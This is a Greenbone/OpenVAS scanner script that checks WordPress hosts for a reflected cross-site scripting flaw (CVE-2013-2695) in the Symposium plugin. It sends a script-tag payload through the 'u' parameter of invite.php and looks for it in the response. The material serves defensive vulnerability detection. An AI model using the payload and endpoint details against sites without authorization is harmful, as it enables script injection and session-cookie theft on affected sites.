CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803373" );
	script_version( "2020-02-26T12:57:19+0000" );
	script_cve_id( "CVE-2013-2695" );
	script_bugtraq_id( 59044 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-02-26 12:57:19 +0000 (Wed, 26 Feb 2020)" );
	script_tag( name: "creation_date", value: "2013-04-17 17:30:46 +0530 (Wed, 17 Apr 2013)" );
	script_name( "WordPress Symposium Plugin XSS Vulnerability" );
	script_xref( name: "URL", value: "http://www.securelist.com/en/advisories/52864" );
	script_xref( name: "URL", value: "http://nakedsecurity.com/nsa/246758.htm" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site." );
	script_tag( name: "affected", value: "WordPress Symposium Plugin version 13.02 and prior" );
	script_tag( name: "insight", value: "The input passed via 'u' parameters to
  'wordpress/wp-content/plugins/wp-symposium/invite.php' script is not
  properly validated before being returned to the user." );
	script_tag( name: "solution", value: "Upgrade WordPress Symposium Plugin version 13.04 or later." );
	script_tag( name: "summary", value: "This host is running WordPress with Symposium plugin and is
  prone to cross site scripting vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://wordpress.org/extend/plugins/wp-symposium" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = dir + "/wp-content/plugins/wp-symposium/invite.php?u=" + "\"><script>alert(document.cookie)</script>";
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "><script>alert\\(document\\.cookie\\)</script>" )){
	security_message( port );
	exit( 0 );
}

